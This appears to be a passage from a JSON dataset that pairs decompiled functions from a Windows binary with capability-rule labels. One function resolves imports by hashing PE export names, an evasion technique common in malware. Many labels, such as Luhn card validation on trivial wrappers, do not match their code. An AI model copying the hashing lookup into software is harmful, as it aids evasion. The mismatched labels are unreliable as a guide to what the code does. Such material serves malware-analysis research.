        "decompiled_code": "\nint32_t fcn.0040e950(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040e930(param_1);\n    if (iVar1 == 0) {\n        iVar1 = *0x4324d0;\n        if (param_2 != 6) {\n            iVar1 = *(param_2 * 0x18 + 0x432444);\n        }\n        (*_sym.imp.USER32.dll_SetPropA)(param_1, *0x4319ee, iVar1);\n    }\n    return iVar1;\n}\n",
        "token_count": 136
    },
    "004159d9": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004159d9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 8);\n    if ((((iVar1 != 0x40) && (iVar1 != 0x80)) && (iVar1 != 0x100)) && (iVar1 != 0x200)) {\n        fcn.00415cc6(param_1);\n        return;\n    }\n    fcn.00406fd6(param_1);\n    return;\n}\n",
        "token_count": 114
    },
    "0040f420": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f420(uint32_t param_1, uint param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint16_t extraout_var;\n    uint32_t uVar3;\n    uint uVar4;\n    uchar *puVar5;\n    \n    iVar2 = fcn.0040e930(param_1);\n    if (iVar2 == 0) {\n        fcn.00410530(param_1, param_2, 0, param_3);\n        return;\n    }\n    iVar2 = (*_sym.imp.USER32.dll_GetPropA)(param_1, *0x4319f4);\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (iVar2 == 0) {\n        uVar4 = 0x1944;\n        uVar3 = param_1;\n        puVar5 = &stack0xfffffff4;\n        (*_sym.imp.USER32.dll_SendMessageA)(param_1, 0x1944, 0);\n        if (puVar5 == 0x29a) {\n            (*pcVar1)(param_1, 0x1943, 0);\n            if (&stack0xfffffff4 == 0x29a) {\n                (*_sym.imp.USER32.dll_RemovePropA)(param_1, *0x4319ee);\n                fcn.00410530(param_1, uVar3 & 0xffff | extraout_var << 0x10, 0, uVar4);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "00407152": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407152(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00408a84(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 103
    },
    "00411b10": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00411b10(uint param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint noname_4;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint32_t unaff_EBP;\n    uint noname_5;\n    uint noname_6;\n    uint noname_7;\n    uint noname_3;\n    uint noname_9;\n    uint noname_10;\n    uint noname_11;\n    uint hWnd;\n    uint hdc;\n    uint nXLeft;\n    uint uStack44;\n    uint uStack40;\n    uint uStack8;\n    \n    uStack40 = 0xfffffff0;\n    uStack44 = param_1;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    if ((uVar2 & 0x10000000) != 0) {\n        (*_sym.imp.USER32.dll_GetClientRect)();\n        pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    // switch table (10 cases) at 0x411c74\n        switch(unaff_EBP & 0x1f) {\n        case 0:\n        case 1:\n        case 2:\n        case 0xc:\n            nXLeft = 0;\n            hdc = 0;\n            hWnd = 0x31;\n            noname_11 = param_1;\n            iVar3 = (*_sym.imp.USER32.dll_SendMessageA)();\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.GDI32.dll_SelectObject)();\n            }\n            noname_10 = 2;\n            noname_9 = unaff_EBX;\n            (*_sym.imp.GDI32.dll_SetBkMode)();\n            noname_6 = 0x138;\n            noname_5 = param_1;\n            noname_7 = unaff_EBX;\n            noname_3 = param_1;\n            noname_4 = (*_sym.imp.USER32.dll_GetParent)();\n            iVar4 = (*pcVar1)();\n            if (iVar4 != 0) {\n                iVar4 = (*_sym.imp.GDI32.dll_SelectObject)(unaff_EBX, iVar4);\n            }\n            fcn.00411a30(param_1, unaff_EBX, &stack0xffffffb4, noname_3, noname_4, noname_5, noname_6, noname_7, \n                         noname_3, noname_9, noname_10, noname_11, hWnd, hdc, nXLeft);\n            if (iVar3 != 0) {\n                (*_sym.imp.GDI32.dll_SelectObject)(unaff_EBX, iVar3);\n            }\n            if (iVar4 != 0) {\n                (*_sym.imp.GDI32.dll_SelectObject)(unaff_EBX, iVar4);\n                return;\n            }\n            break;\n        case 4:\n        case 7:\n            fcn.0040ec60();\n            return;\n        case 5:\n        case 8:\n        case 0x10:\n        case 0x11:\n        case 0x12:\n            fcn.0040ec60();\n            (*_sym.imp.USER32.dll_OffsetRect)();\n            fcn.0040ec60(uStack8, &uStack44);\n            return;\n        case 6:\n        case 9:\n            fcn.0040ec60();\n        }\n    }\n    return;\n}\n",
        "token_count": 761
    },
    "0040104f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040104f(void)\n\n{\n    fcn.00407080(fcn.00401061);\n    return;\n}\n",
        "token_count": 30
    },
    "00401140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __fastcall fcn.00401140(uint param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x41bc89;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    fcn.00415acc(param_1);\n    var_4h = 0xffffffff;\n    fcn.00415143();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 147
    },
    "004011a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004011a0(uint arg_8h)\n\n{\n    fcn.00415cc6(arg_8h);\n    return;\n}\n",
        "token_count": 35
    },
    "0040120c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.0040120c(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41bcb5;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004153bb(0x66, arg_8h);\n    var_4h = 0;\n    fcn.00405860();\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    *in_ECX = 0x41d698;\n    fcn.00415bc5(0x42de38);\n    uVar1 = 0x80;\n    fcn.00405880();\n    uVar1 = fcn.00406520(uVar1);\n    in_ECX[0x18] = uVar1;\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 262
    },
    "00401296": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401296(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.004064d0(arg_8h);\n    fcn.00419f24(arg_8h, 0x3e9, in_ECX + 0x5c);\n    return;\n}\n",
        "token_count": 80
    },
    "004012f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004012f2(void)\n\n{\n    fcn.00407080(fcn.00401304);\n    return;\n}\n",
        "token_count": 30
    },
    "00401331": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401331(void)\n\n{\n    fcn.00407080(fcn.00401343);\n    return;\n}\n",
        "token_count": 29
    },
    "0040136c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040136c(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    for (; *arg_8h != 0; arg_8h = arg_8h + 1) {\n        var_4h = var_4h * 0x1f + *arg_8h;\n    }\n    return var_4h;\n}\n",
        "token_count": 107
    },
    "004013a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004013a5(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint arg_ch;\n    int32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00401352();\n    iVar1 = *(*(iVar2 + 0xc) + 0xc);\n    var_10h = *(*(iVar2 + 0xc) + 0xc);\n    do {\n        arg_ch = *0x423110;\n        arg_8h_00 = fcn.00407496(var_10h[0xc]);\n        iVar2 = fcn.0040136c(arg_8h_00, arg_ch);\n        if (iVar2 == arg_8h) {\n            return var_10h[6];\n        }\n        var_10h = *var_10h;\n    } while (var_10h != iVar1);\n    return 0;\n}\n",
        "token_count": 238
    },
    "0040140f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040140f(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = arg_8h + *(arg_8h + *(arg_8h + 0x3c) + 0x78);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x423114);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x423164);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x4231b4);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x423204);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x423254);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x4232a4);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x4232f4);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x423344);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x423394);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x4233e4);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x423434);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x423484);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x4234d4);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x423524);\n    fcn.004059e0(pcVar6);\n    pcVar6 = fcn.00405890;\n    fcn.00406070(0x430248, 0x423574);\n    fcn.004059e0(pcVar6);\n    iVar1 = *(iVar5 + 0x20);\n    iVar2 = *(iVar5 + 0x1c);\n    iVar3 = *(iVar5 + 0x24);\n    var_14h = 0;\n    while( true ) {\n        if (*(iVar5 + 0x18) <= var_14h) {\n            return 0;\n        }\n        iVar4 = fcn.0040136c(arg_8h + *(arg_8h + iVar1 + var_14h * 4), *0x423110);\n        if (iVar4 == arg_ch) break;\n        var_14h = var_14h + 1;\n    }\n    return arg_8h + *(arg_8h + iVar2 + *(arg_8h + iVar3 + var_14h * 2) * 4);\n}\n",
        "token_count": 999
    },
    "004054ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004054ae(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint wParam;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint lParam;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41bcee;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    iVar1 = fcn.00405e90();\n    if (iVar1 == 0) {\n        fcn.00406470();\n    }\n    else {\n        fcn.004197c7(param_1);\n        var_4h = 0;\n        lParam = 0;\n        wParam = fcn.00405980();\n        fcn.00405e10(0x27, wParam, lParam);\n        iVar1 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0xb);\n        iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0xc);\n        fcn.00405900();\n        fcn.00405ed0(&var_1ch);\n        iVar3 = fcn.00405910();\n        iVar4 = fcn.00405930();\n        fcn.004059b0(((iVar3 - iVar1) + 1) / 2, ((iVar4 - iVar2) + 1) / 2, *(param_1 + 0x60));\n        var_4h = 0xffffffff;\n        fcn.00419839();\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 420
    },
    "004057cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004057cc(void)\n\n{\n    fcn.00407080(fcn.00406460);\n    return;\n}\n",
        "token_count": 29
    },
    "004059e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004059e0(code *arg_8h)\n\n{\n    uint var_4h;\n    \n    (*arg_8h)();\n    return;\n}\n",
        "token_count": 38
    },
    "0040657e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040657e(void)\n\n{\n    fcn.00407080(fcn.00406590);\n    return;\n}\n",
        "token_count": 30
    },
    "004065bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.004065bc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint *in_FS_OFFSET;\n    uint var_114h;\n    uint lpBuffer;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41bd7e;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    in_ECX[2] = arg_10h;\n    fcn.00405860();\n    var_4h = 0;\n    fcn.00405860();\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    *in_ECX = 0x41d768;\n    in_ECX[1] = arg_8h;\n    fcn.00415b75(arg_ch);\n    iVar1 = fcn.004058b0();\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryA)(0x104, &lpBuffer);\n        if (iVar1 != 0) {\n            fcn.00415bc5(&lpBuffer);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 316
    },
    "0040668b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040668b(uint *param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x41bd94;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = 0x41d768;\n    var_4h = 0;\n    fcn.00415acc();\n    var_4h = 0xffffffff;\n    fcn.00415acc();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 143
    },
    "00406814": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406814(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00415b75(arg_8h);\n    return;\n}\n",
        "token_count": 42
    },
    "00406830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406830(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0041585f(in_ECX + 0x10);\n    return arg_8h;\n}\n",
        "token_count": 65
    },
    "00406b05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406b05(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t pvParam;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    iVar2 = fcn.0040696c();\n    if (iVar2 == 0) {\n        if ((((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) &&\n           (iVar2 = (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x30, 0, &pvParam, 0),  iVar2 != 0)) {\n            arg_ch[1] = 0;\n            arg_ch[2] = 0;\n            pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n            uVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n            arg_ch[3] = uVar4;\n            uVar4 = (*pcVar1)(1);\n            arg_ch[5] = pvParam;\n            arg_ch[6] = uStack16;\n            arg_ch[7] = uStack12;\n            arg_ch[8] = uStack8;\n            uVar3 = 1;\n            arg_ch[4] = uVar4;\n            arg_ch[9] = 1;\n            if (0x47 < *arg_ch) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(arg_ch + 10, \"DISPLAY\");\n            }\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = (**0x42f840)(arg_8h, arg_ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 414
    },
    "0040795e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040795e(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    \n    if (param_1 != 0) {\n        fcn.004096f8(9);\n        arg_8h = fcn.0040a39e(param_1);\n        if (arg_8h != 0) {\n            fcn.0040a3c9(arg_8h, param_1);\n            fcn.00409759(9);\n            return;\n        }\n        fcn.00409759(9);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x43165c, 0, param_1);\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00407f97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00407f97(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 <= *0x42d2d0) {\n        fcn.004096f8(9);\n        iVar1 = fcn.0040a6f4(param_1);\n        fcn.00409759(9);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n    }\n    if (param_1 == 0) {\n        param_1 = 1;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x43165c, 0, param_1 + 0xf & 0xfffffff0);\n    return iVar1;\n}\n",
        "token_count": 167
    },
    "004088c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004088c7(uint32_t param_1)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    puVar1 = fcn.00408943();\n    iVar3 = 0;\n    *puVar1 = param_1;\n    puVar1 = 0x42cd90;\n    do {\n        if (param_1 == *puVar1) {\n            puVar2 = fcn.0040893a();\n            *puVar2 = *(iVar3 * 8 + 0x42cd94);\n            return;\n        }\n        puVar1 = puVar1 + 2;\n        iVar3 = iVar3 + 1;\n    } while (puVar1 < 0x42cef8);\n    if ((0x12 < param_1) && (param_1 < 0x25)) {\n        puVar2 = fcn.0040893a();\n        *puVar2 = 0xd;\n        return;\n    }\n    if ((0xbb < param_1) && (param_1 < 0xcb)) {\n        puVar2 = fcn.0040893a();\n        *puVar2 = 8;\n        return;\n    }\n    puVar2 = fcn.0040893a();\n    *puVar2 = 0x16;\n    return;\n}\n",
        "token_count": 300
    },
    "0040a280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.0040a280(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar4 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar4 != 0) {\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (uVar1 == 0) goto code_r0x0040a2cf;\n        uVar4 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar5 = puVar3;\n            puVar3 = puVar5 + 1;\n        } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);\n        uVar4 = *puVar5;\n        if (uVar4 == '\\0') goto code_r0x0040a2e1;\n        if (uVar4 >> 8 == '\\0') {\n            puVar5 = puVar5 + 1;\n            goto code_r0x0040a2e1;\n        }\n        if ((uVar4 & 0xff0000) == 0) {\n            puVar5 = puVar5 + 2;\n            goto code_r0x0040a2e1;\n        }\n    } while ((uVar4 & 0xff000000) != 0);\ncode_r0x0040a2cf:\n    puVar5 = puVar3 + -1;\ncode_r0x0040a2e1:\n    uVar4 = param_2 & 3;\n    while (uVar4 != 0) {\n        uVar1 = *param_2;\n        uVar4 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x0040a358;\n        *puVar5 = uVar1;\n        puVar5 = puVar5 + 1;\n        uVar4 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar4 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar4 == '\\0') {\ncode_r0x0040a358:\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if (uVar4 >> 8 == '\\0') {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if ((uVar4 & 0xff0000) == 0) {\n                *puVar5 = uVar4;\n                *(puVar5 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar4 & 0xff000000) == 0) {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n        }\n        *puVar5 = uVar4;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 762
    },
    "0040a270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.0040a270(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    uVar3 = param_2 & 3;\n    puVar4 = param_1;\n    while (uVar3 != 0) {\n        uVar1 = *param_2;\n        uVar3 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x0040a358;\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        uVar3 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar3 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar3 == '\\0') {\ncode_r0x0040a358:\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if (uVar3 >> 8 == '\\0') {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if ((uVar3 & 0xff0000) == 0) {\n                *puVar4 = uVar3;\n                *(puVar4 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar3 & 0xff000000) == 0) {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n        }\n        *puVar4 = uVar3;\n        puVar4 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 439
    },
    "0040c0bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t * __cdecl fcn.0040c0bd(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(unaff_EBP + -0x10) = 0;\n    if (*(unaff_EBP + 0x14) != 0) {\n        *extraout_ECX = 0x41ecd0;\n        extraout_ECX[10] = 0;\n        extraout_ECX[1] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n        *(unaff_EBP + -0x10) = 1;\n        *(unaff_EBP + -4) = 0;\n    }\n    cVar1 = *(unaff_EBP + 0x10);\n    *(*(*extraout_ECX + 4) + extraout_ECX) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    if (cVar1 != '\\0') {\n        fcn.0040cb11(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 388
    },
    "0040c191": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t * __cdecl fcn.0040c191(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(unaff_EBP + -0x10) = 0;\n    if (*(unaff_EBP + 0x10) != 0) {\n        *extraout_ECX = 0x41ecd8;\n        extraout_ECX[0xb] = 0;\n        extraout_ECX[2] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n        *(unaff_EBP + -0x10) = 1;\n        *(unaff_EBP + -4) = 0;\n    }\n    extraout_ECX[1] = 0;\n    uVar1 = *(unaff_EBP + 0xc);\n    uVar2 = *(unaff_EBP + 8);\n    *(*(*extraout_ECX + 4) + extraout_ECX) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    fcn.0040cb11(uVar2, uVar1);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 389
    },
    "0040c35d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c35d(code **param_1)\n\n{\n    uint *puVar1;\n    \n    *param_1 = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    if (param_1[0xd] != NULL) {\n        puVar1 = fcn.0040c324();\n        if (puVar1 != NULL) {\n            (***puVar1)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "0040d274": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
